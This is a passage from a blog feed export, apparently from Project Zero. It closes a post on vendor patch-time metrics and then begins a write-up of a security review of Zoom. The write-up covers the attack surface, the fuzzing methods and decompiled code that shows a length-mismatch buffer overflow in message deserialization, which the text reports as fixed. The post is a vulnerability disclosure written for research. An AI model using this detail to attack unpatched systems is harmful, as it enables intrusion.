the industry.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span class="c7"&gt;One important caveat&lt;/span&gt;&lt;span&gt;: we are aware that reports from Project Zero may be outliers compared to other bug reports, in that they may receive faster action &lt;/span&gt;&lt;span&gt;as there is a tangible risk of public disclosure&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;(as the team will disclose if deadline conditions are not met) and Project Zero is a trusted source of reliable bug reports. We encourage vendors to release metrics, even if they are high level, to give a better overall picture of how quickly security issues are being fixed across the industry, and continue to encourage other security researchers to share their experiences.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span&gt;For Google, &lt;/span&gt;&lt;span&gt;and in particular Chrome, we suspect that the quick turnaround time on security bugs is in part due to their rapid release cycle, as well as their additional stable releases for security updates. We&amp;#39;re encouraged by Chrome&amp;#39;s recent switch from a 6-week release cycle to a &lt;/span&gt;&lt;span class="c17"&gt;&lt;a class="c201" href="https://blog.chromium.org/2021/03/speeding-up-release-cycle.html"&gt;4-week release cycle&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;On the Android side, we see the Pixel variant of Android releasing fixes about on par with the Samsung variants as well as iOS. Even so, we encourage the Android team to look for additional ways to speed up the application of security updates and push that segment of the industry further.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span&gt;For Apple, we&amp;#39;re pleased &lt;/span&gt;&lt;span&gt;with the&lt;/span&gt;&lt;span&gt;&amp;nbsp;acceleration of patches landing, as well as the recent lack of use of grace periods as well as lack of missed deadlines. For WebKit in particular, we hope to see a reduction in the amount of time it takes between landing a patch and shipping it out to users, &lt;/span&gt;&lt;span&gt;especially since WebKit security affects all browsers used in iOS, as WebKit is the only browser engine permitted on&lt;/span&gt;&lt;span&gt;&amp;nbsp;the iOS platform. &lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span&gt;For Microsoft, we suspect that the high time to fix and Microsoft&amp;#39;s reliance on the grace period are consequences of the monthly cadence of Microsoft&amp;#39;s &amp;quot;patch Tuesday&amp;quot; updates, which can make it more difficult for development teams to meet a disclosure deadline. We hope that Microsoft might consider implementing a more frequent patch cadence for security issues, or finding ways to further streamline their internal processes to land and ship code quicker.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c29" id="h.ta2a9qyxrinj"&gt;&lt;span class="c31"&gt;Moving forward&lt;/span&gt;&lt;/h1&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;This post represents some number-crunching we&amp;#39;ve done of our own public data, and we hope to continue this going forward. Now that we&amp;#39;ve established a baseline over the past few years, we plan to continue to publish an annual update to better understand how the trends progress.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span&gt;To that end, we&amp;#39;d love to have even more insight into the processes and timelines of our vendors. We encourage all vendors to consider publishing &lt;/span&gt;&lt;span&gt;aggregate&lt;/span&gt;&lt;span&gt;&amp;nbsp;data on their time-to-fix and time-to-patch for externally reported vulnerabilities. Through more transparency, information sharing, and collaboration across the industry, we believe we can learn from each other&amp;#39;s best practices, better understand existing difficulties and hopefully make the internet a safer place for all.&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/3889819885234441482/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2022/02/a-walk-through-project-zero-metrics.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/3889819885234441482" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/3889819885234441482" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2022/02/a-walk-through-project-zero-metrics.html" title="A walk through Project Zero metrics" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://blogger.googleusercontent.com/img/a/AVvXsEjfS0R9o3QylkBNHZbNj2pMaBXdFVRkr-uLDOJwOOT9Pn1UcDvnmCtqVSnW07GnHn6egWc5vSOcCzYosmhvtIo2XBsOkJtXQAGLkloOlMweBEthnKEbqJtAbqRvK8dl_CJisoyAYdNC0IN52_bwbFxOFvqHhzqj36tF-iWIP3_KNUO7xdvBtNojGfdxfw=s72-c" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-1246610633949568195</id>
    <published>2022-01-18T09:28:00.000-08:00</published>
    <updated>2022-01-18T09:28:18.118-08:00</updated>
    <title type="text">Zooming in on Zero-click Exploits</title>
    <content type="html">&lt;style type="text/css"&gt;ul.lst-kix_ef7dug197aaw-4{list-style-type:none}ul.lst-kix_ef7dug197aaw-3{list-style-type:none}.lst-kix_ef7dug197aaw-0&gt;li:before{content:"-  "}ul.lst-kix_ef7dug197aaw-2{list-style-type:none}ul.lst-kix_ef7dug197aaw-1{list-style-type:none}.lst-kix_ef7dug197aaw-1&gt;li:before{content:"-  "}ul.lst-kix_ef7dug197aaw-8{list-style-type:none}ul.lst-kix_ef7dug197aaw-7{list-style-type:none}ul.lst-kix_ef7dug197aaw-6{list-style-type:none}ul.lst-kix_ef7dug197aaw-5{list-style-type:none}ul.lst-kix_ef7dug197aaw-0{list-style-type:none}.lst-kix_ef7dug197aaw-7&gt;li:before{content:"-  "}.lst-kix_ef7dug197aaw-6&gt;li:before{content:"-  "}.lst-kix_ef7dug197aaw-8&gt;li:before{content:"-  "}.lst-kix_ef7dug197aaw-5&gt;li:before{content:"-  "}.lst-kix_ef7dug197aaw-3&gt;li:before{content:"-  "}.lst-kix_ef7dug197aaw-2&gt;li:before{content:"-  "}.lst-kix_ef7dug197aaw-4&gt;li:before{content:"-  "}ol{margin:0;padding:0}table td,table th{padding:0}.c7{background-color:#ffffff;color:#222222;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c18{background-color:#ffffff;padding-top:0pt;padding-bottom:0pt;line-height:1.2222222222222223;orphans:2;widows:2;text-align:left}.c10{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:"Arial";font-style:normal}.c13{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c14{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:13.5pt;font-family:"Arial";font-style:normal}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Courier New";font-style:normal}.c15{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:13.5pt;font-family:"Arial";font-style:normal}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c17{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c9{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c16{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c6{font-weight:400;font-family:"Courier New"}.c8{color:inherit;text-decoration:inherit}.c4{border:1px solid black;margin:5px}.c21{font-size:13.5pt;font-weight:700}.c11{background-color:#ffffff;color:#222222}.c20{background-color:#ffffff}.c19{margin-left:36pt}.c12{height:11pt}.c5{text-indent:36pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c16"&gt; &lt;p class="c1"&gt;&lt;span&gt;Posted by Natalie Silvanovich, Project Zero&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;&lt;br&gt;&lt;/span&gt;&lt;span&gt;Zoom&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a video conferencing platform that has gained popularity throughout the pandemic. Unlike other video conferencing systems that I have investigated, where one user initiates a call that other users must immediately accept or reject, Zoom calls are typically scheduled in advance and joined via an email invitation. In the past, I hadn&amp;rsquo;t prioritized reviewing Zoom because I believed that any attack against a Zoom client would require multiple clicks from a user. However, a zero-click attack against the Windows Zoom client was recently &lt;/span&gt;&lt;span class="c17"&gt;&lt;a class="c81" href="https://blog.zoom.us/zoom-sponsors-pwn2own-security-competition/"&gt;revealed&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;at Pwn2Own, showing that it does indeed have a fully remote attack surface. The following post details my investigation into Zoom.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;This analysis resulted in two vulnerabilities being&lt;/span&gt;&lt;span&gt;&amp;nbsp;reported to Zoom. One was a buffer overflow that affected both Zoom clients and MMR servers, and one was an info leak that is only useful to attackers on MMR servers. Both of these vulnerabilities were fixed on November 24, 2021. &lt;/span&gt;&lt;/p&gt;&lt;h2 class="c13" id="h.m2ive1t3pjbm"&gt;&lt;span class="c10"&gt;Zoom Attack Surface Overview&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;Zoom&amp;rsquo;s main feature is multi-user conference calls called meetings that support a variety of features including audio, video, screen sharing and in-call text messages. There are several ways that users can join Zoom meetings. To start, Zoom provides full-featured installable clients for many platforms, including Windows, Mac, Linux, Android and iPhone. Users can also join Zoom meetings using a browser link, but they are able to use fewer features of Zoom. Finally, users can join a meeting by dialing phone numbers provided in the invitation on a touch-tone phone, but this only allows access to the audio stream of a meeting. This research focused on the Zoom client software, as the other methods of joining calls use existing device features.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;Zoom clients support several communication features other than meetings that are available to a user&amp;rsquo;s Zoom Contacts. A Zoom Contact is a user that another user has added as a contact using the Zoom user interface. Both users must consent before they become Zoom Contacts. Afterwards, the users can send text messages to one another outside of meetings and start channels for persistent group conversations. Also, if either user hosts a meeting, they can invite the other user in a manner that is similar to a phone call: the other user is immediately notified and they can join the meeting with a single click. These features represent the zero-click attack surface of Zoom. Note that this attack surface is only available to attackers that have convinced their target to accept them as a contact. Likewise, meetings are part of the one-click attack surface only for Zoom Contacts, as other users need to click several times to enter a meeting.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;That said, it&amp;rsquo;s likely not that difficult for a dedicated attacker to convince a target to join a Zoom call even if it takes multiple clicks, and the way some organizations use Zoom presents interesting attack scenarios. For example, many groups host public Zoom meetings, and Zoom supports a paid Webinar feature where large groups of unknown attendees can join a one-way video conference. It could be possible for an attacker to join a public meeting and target other attendees. Zoom also relies on a server to transmit audio and video streams, and end-to-end encryption is off by default. It could be possible for an attacker to compromise Zoom&amp;rsquo;s servers and gain access to meeting data.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c13" id="h.l871so51iqig"&gt;&lt;span class="c10"&gt;Zoom Messages&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;I started out by looking at the zero-click attack surface of Zoom. Loading the Linux client into IDA, it appeared that a great deal of its server communication occurred over XMPP. Based on strings in the binary, it was clear that XMPP parsing was performed using a library called &lt;/span&gt;&lt;span class="c17"&gt;&lt;a class="c81" href="https://camaya.net/gloox/"&gt;gloox&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;. I fuzzed this library using AFL and other coverage-guided fuzzers, but did not find any vulnerabilities. I then looked at how Zoom uses the data provided over XMPP.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;XMPP traffic seemed to be sent over SSL, so I located the &lt;/span&gt;&lt;span class="c6"&gt;SSL_write&lt;/span&gt;&lt;span&gt;&amp;nbsp;function in the binary based on log strings, and hooked it using &lt;/span&gt;&lt;span class="c17"&gt;&lt;a class="c81" href="https://frida.re/"&gt;Frida&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;. The output contained many XMPP stanzas (messages) as well as other network traffic, which I analyzed to determine how XMPP is used by Zoom. XMPP is used for most communication between Zoom clients outside of meetings, such as messages and channels, and is also used for signaling (call set-up) when a Zoom Contact invites another Zoom Contact to a meeting.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;I spent some time going through the client binary trying to determine how the client processes XMPP, for example, if a stanza contains a text message, how is that message extracted and displayed in the client. Even though the Zoom client contains many log strings, this was challenging, and I eventually asked my teammate Ned Williamson for help locating symbols for the client. He discovered that several old versions of the Android Zoom SDK contained symbols. While these versions are roughly five years old, and do not present a complete view of the client as they only include some libraries that it uses, they were immensely helpful in understanding how Zoom uses XMPP.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Application-defined tags can be added to gloox&amp;rsquo;s XMPP parser by extending the class &lt;/span&gt;&lt;span class="c6"&gt;StanzaExtension&lt;/span&gt;&lt;span&gt;&amp;nbsp;and implementing the method &lt;/span&gt;&lt;span class="c6"&gt;newInstance&lt;/span&gt;&lt;span&gt;&amp;nbsp;to define how the tag is converted into a C++ object. Parsed XMPP stanzas are then processed using the &lt;/span&gt;&lt;span class="c6"&gt;MessageHandler&lt;/span&gt;&lt;span&gt;&amp;nbsp;class. Application developers extend this class, implementing the method &lt;/span&gt;&lt;span class="c6"&gt;handleMessage&lt;/span&gt;&lt;span&gt;&amp;nbsp;with code that performs application functionality based on the contents of the stanza received. Zoom implements its XMPP handling in &lt;/span&gt;&lt;span class="c6"&gt;CXmppIMSession::handleMessage&lt;/span&gt;&lt;span&gt;, which is a large function that is an entrypoint to most messaging and calling features. The final processing stage of many XMPP tags is in the class &lt;/span&gt;&lt;span class="c6"&gt;ns_zoom_messager::CZoomMMXmppWrapper&lt;/span&gt;&lt;span&gt;, which contains many methods starting with &amp;lsquo;On&amp;rsquo; that handle specific events. I spent a fair amount of time analyzing these code paths, but didn&amp;rsquo;t find any bugs. Interestingly, Thijs Alkemade and Daan Keuper released a &lt;/span&gt;&lt;span class="c17"&gt;&lt;a class="c81" href="https://sector7.computest.nl/post/2021-08-zoom/"&gt;write-up&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;of their Pwn2Own bug after I completed this research, and it involved a vulnerability in this area.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c13" id="h.xi3fsuloyufo"&gt;&lt;span&gt;RTP Processing&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Afterwards, I investigated how Zoom clients process audio and video content. Like all other video conferencing systems that I have analyzed, it uses Real-time Transport Protocol (RTP) to transport this data. Based on log strings included in the Linux client binary, Zoom appears to use a branch of WebRTC for audio. Since I have looked at this library a great deal in &lt;/span&gt;&lt;span class="c17"&gt;&lt;a class="c81" href="https://googleprojectzero.blogspot.com/2018/12/adventures-in-video-conferencing-part-1.html"&gt;previous&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17"&gt;&lt;a class="c81" href="https://googleprojectzero.blogspot.com/2020/08/exploiting-android-messengers-part-1.html"&gt;posts&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;, I did not investigate it further. For video, Zoom implements its own RTP processing and uses a custom underlying codec named Zealot (libzlt).&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;Analyzing the Linux client in IDA, I found what I believed to be the video RTP entrypoint, and fuzzed it using afl-qemu. This resulted in several crashes, mostly in RTP extension processing. I tried modifying the RTP sent by a client to reproduce these bugs, but it was not received by the device on the other side and I suspected the server was filtering it. I tried to get around this by enabling end-to-end encryption, but Zoom does not encrypt RTP headers, only the contents of RTP packets (as is typical of most RTP implementations).&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Curious about how Zoom server filtering works, I decided to set up &lt;/span&gt;&lt;span class="c17"&gt;&lt;a class="c81" href="https://support.zoom.us/hc/en-us/articles/360034064852-Zoom-On-Premise-Deployment"&gt;Zoom On-Premises Deployment&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;. This is a Zoom product that allows customers to set up on-site servers to process their organization&amp;rsquo;s Zoom calls. This required a fair amount of configuration, and I ended up reaching out to the Zoom Security Team for assistance. They helped me get it working, and I greatly appreciate their contribution to this research.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Zoom On-Premises Deployments consist of two hosts: the controller and the Multimedia Router (MMR)&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;Analyzing the traffic to each server, it became clear that the MMR is the host that transmits audio and video content between Zoom clients. Loading the code for the MMR process into IDA, I located where RTP is processed, and it indeed parses the extensions as a part of its forwarding logic and verifies them correctly, dropping any RTP packets that are malformed.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;The code that processes RTP on the MMR appeared different than the code that I fuzzed on the device, so I set up fuzzing on the server code as well. This was challenging, as the code was in the MMR binary, which was not compiled as a relocatable binary (more on this later). This meant that I couldn&amp;rsquo;t load it as a library and call into specific offsets in the binary as I usually do to fuzz binaries that don&amp;rsquo;t have source code available. Instead, I compiled my own fuzzing stub that called the function I wanted to fuzz as a relocatable that defined &lt;/span&gt;&lt;span class="c6"&gt;fopen&lt;/span&gt;&lt;span&gt;, and loaded it using &lt;/span&gt;&lt;span class="c6"&gt;LD_PRELOAD&lt;/span&gt;&lt;span&gt;&amp;nbsp;when executing the MMR binary. Then my code would take control of execution the first time that the MMR binary called &lt;/span&gt;&lt;span class="c6"&gt;fopen&lt;/span&gt;&lt;span class="c2"&gt;, and was able to call the function being fuzzed.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;This approach has a lot of downsides, the biggest being that the fuzzing stub can&amp;rsquo;t accept command line parameters, execution is fairly slow and a lot of fuzzing tools don&amp;rsquo;t honor &lt;/span&gt;&lt;span class="c6"&gt;LD_PRELOAD&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the target. That said, I was able to fuzz with code coverage using Mateusz Jurczyk&amp;rsquo;s excellent &lt;/span&gt;&lt;span class="c17"&gt;&lt;a class="c81" href="https://github.com/googleprojectzero/DrSancov"&gt;DrSanCov&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;, with no results.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c13" id="h.89pbrd4mybwj"&gt;&lt;span class="c10"&gt;Packet Processing&lt;/span&gt;&lt;/h2&gt; &lt;p class="c1"&gt;&lt;span&gt;When analyzing RTP traffic, I noticed that both Zoom clients and the MMR server process a great deal of packets that didn&amp;rsquo;t appear to be RTP or XMPP. Looking at the SDK with symbols, one library appeared to do a lot of serialization: libssb_sdk.so. This library contains a great deal of classes with the methods &lt;/span&gt;&lt;span class="c6"&gt;load_from&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c6"&gt;save_to &lt;/span&gt;&lt;span class="c2"&gt;defined with identical declarations, so it is likely that they all implement the same virtual class.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;One parameter to the &lt;/span&gt;&lt;span class="c6"&gt;load_from&lt;/span&gt;&lt;span&gt;&amp;nbsp;methods is an object of class &lt;/span&gt;&lt;span class="c6"&gt;msg_db_t&lt;/span&gt;&lt;span&gt;, &amp;nbsp;which implements a buffer that supports reading different data types. Deserialization is performed by &lt;/span&gt;&lt;span class="c6"&gt;load_from&lt;/span&gt;&lt;span&gt;&amp;nbsp;methods by reading needed data from the &lt;/span&gt;&lt;span class="c6"&gt;msg_db_t&lt;/span&gt;&lt;span&gt;&amp;nbsp;object, and serialization is performed by &lt;/span&gt;&lt;span class="c6"&gt;save_to&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;methods by writing to it.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;After hooking a few &lt;/span&gt;&lt;span class="c6"&gt;save_to&lt;/span&gt;&lt;span&gt;&amp;nbsp;methods with Frida and comparing the written output to data sent with &lt;/span&gt;&lt;span class="c6"&gt;SSL_write&lt;/span&gt;&lt;span&gt;, it became clear that these serialization classes are part of the remote attack surface of Zoom. Reviewing each &lt;/span&gt;&lt;span class="c6"&gt;load_from&lt;/span&gt;&lt;span&gt;&amp;nbsp;method, several contained code similar to the following (from&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;ssb::conf_send_msg_req::load_from&lt;/span&gt;&lt;span class="c2"&gt;).&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;ssb::i_stream_t&amp;lt;ssb::msg_db_t,ssb::bytes_convertor&amp;gt;::operator&amp;gt;&amp;gt;(&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c19 c5"&gt;&lt;span class="c3"&gt;msg_db, &amp;amp;this-&amp;gt;str_len, consume_bytes, error_out);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; str_len = this-&amp;gt;str_len;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; if ( str_len )&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; {&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; mem = operator new[](str_len);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; out_len = 0;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; this-&amp;gt;str_mem = mem;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; ssb::i_stream_t&amp;lt;ssb::msg_db_t,ssb::bytes_convertor&amp;gt;::&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c5 c19"&gt;&lt;span class="c3"&gt;read_str_with_len(msg_db, mem, &amp;amp;out_len);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;read_str_with_len &lt;/span&gt;&lt;span&gt;i&lt;/span&gt;&lt;span class="c2"&gt;s defined as follows.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;int __fastcall ssb::i_stream_t&amp;lt;ssb::msg_db_t,ssb::bytes_convertor&amp;gt;::&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c5"&gt;&lt;span class="c3"&gt;read_str_with_len(msg_db_t* msg, signed __int8 *mem,&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c5"&gt;&lt;span class="c3"&gt;unsigned int *len)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; if ( !msg-&amp;gt;invalid )&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; {&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c5"&gt;&lt;span class="c3"&gt;ssb::i_stream_t&amp;lt;ssb::msg_db_t,ssb::bytes_convertor&amp;gt;::operator&amp;gt;&amp;gt;(msg, len, (int)len, 0);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; if ( !msg-&amp;gt;invalid )&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; {&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; if ( *len )&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ssb::i_stream_t&amp;lt;ssb::msg_db_t,ssb::bytes_convertor&amp;gt;::&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;read(msg, mem, *len, 0);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; return msg;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Note that the string buffer is allocated based on a length read from the &lt;/span&gt;&lt;span class="c6"&gt;msg_db_t &lt;/span&gt;&lt;span&gt;buffer, but then a second length is read from the buffer and used as the length of the string that is read. This means that if an attacker could manipulate the contents of the &lt;/span&gt;&lt;span class="c6"&gt;msg_db_t &lt;/span&gt;&lt;span class="c2"&gt;buffer, they could specify the length of the buffer allocated, and overwrite it with any length of data (up to a limit of 0x1FFF bytes, not shown in the code snippet above). &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p 